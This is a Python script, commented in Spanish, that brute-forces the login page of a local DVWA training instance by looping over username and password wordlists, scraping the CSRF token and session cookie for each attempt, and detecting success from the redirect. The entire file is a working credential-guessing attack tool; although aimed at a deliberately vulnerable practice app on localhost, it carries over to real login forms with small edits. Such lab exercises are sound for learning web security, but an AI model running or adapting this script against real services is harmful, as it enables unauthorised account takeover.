import requests
from bs4 import BeautifulSoup
from pwn import *
import sys
import time

#URL de la aplicacion DVWA que corre localmente por el puerto 80
url = 'http://127.0.0.1/login.php'
try:
    listado_usuarios = sys.argv[1] #'/usr/share/seclists/Usernames/top-usernames-shortlist.txt'
    listado_contrasenas= sys.argv[2] #'/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt'
except IndexError:
    print("\nFaltan parametros")

#Parametros que se envian en la solicitud
parametro_usuario = 'username'
parametro_contrasena = 'password'
parametro_token = 'user_token'

try:

    with open(listado_usuarios, "r") as lu, open(listado_contrasenas, "r") as lp:
        usuarios=[lineas.strip() for lineas in lu.readlines()]
        contrasenas=[lineas.strip() for lineas in lp.readlines()]
        
        try:
            #Objetos para una mejor visualizacion del proceso
            p1 = log.progress("Fuerza Bruta Login - Host")
            p1.status(url)
            p2 = log.progress("Usuario")
            p3 = log.progress("Contrasena")
            p4 = log.progress("Resultado")

            for usuario_login in usuarios:
                for contrasena_login in contrasenas:

                    #Se muestran las credenciales que se van probando
                    p2.status(usuario_login)
                    p3.status(contrasena_login)

                    #Se hace una solicitud get para poder parametrizar el token de usuario 
                    #y las cookies de sesion
                    s=requests.session()
                    res = s.get(url, timeout=5)
                    cookies = res.headers['Set-Cookie']
                    HTML = res.text
                    sopa = BeautifulSoup(HTML,"html.parser")
                    titulo = sopa.title.text

                    
                    #Mediante el titulo de la pagina se determina si es o no la aplicacion
                    if titulo == 'Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*':
                        token = sopa.find("form").find("input", {"name":parametro_token})["value"]

                        #Se empaquetan los parametros a enviar en un diccionario
                        parametros = {parametro_usuario:usuario_login,parametro_contrasena:contrasena_login,parametro_token:token,"Login":"Login"}

                        #Se empaquetan las cookies de sesion en un diccionario
                        cabeceras = {"cookie":cookies,"Content-Type":"application/x-www-form-urlencoded"}
                        res = s.post(url, data=parametros, headers=cabeceras, timeout=5)

                        #Dependiendo de la redireccion se determina si la autenticacion fue exitosa
                        if "index.php" in res.url:
                            exitoso = "Autenticacion exitosa"
                        elif "setup.php" in res.url:
                            exitoso = "Debe configurarse primero la aplicacion"
                        else:
                            exitoso = "Autenticacion fallida"

                        p4.status(exitoso)

                        if exitoso == "Autenticacion exitosa" or exitoso == "Debe configurarse primero la aplicacion" :
                            exit()
                        time.sleep(0.15) #Es un tiempo de retraso solo para visualizar mas lento, se puede quitar

                    else:
                        print("No esta corriendo la aplicacion en el localhost:80")
                        exit()
        
        #Manejo de errores segun exepcion
        except requests.exceptions.ConnectionError:
            print("\nError en la conexion")
            print("\nAutenticacion fallida")
        except requests.exceptions.Timeout:
            print("\nExedio el tiempo de espera de conexion")
            print("\nAutenticacion fallida")
        except KeyboardInterrupt:
            print("\nEjecucion finalizada")

except FileNotFoundError:
    print("\nNo se encuentra/n el/los archivo/s")
except NameError:
    pass
finally:
    print("\nProceso terminado")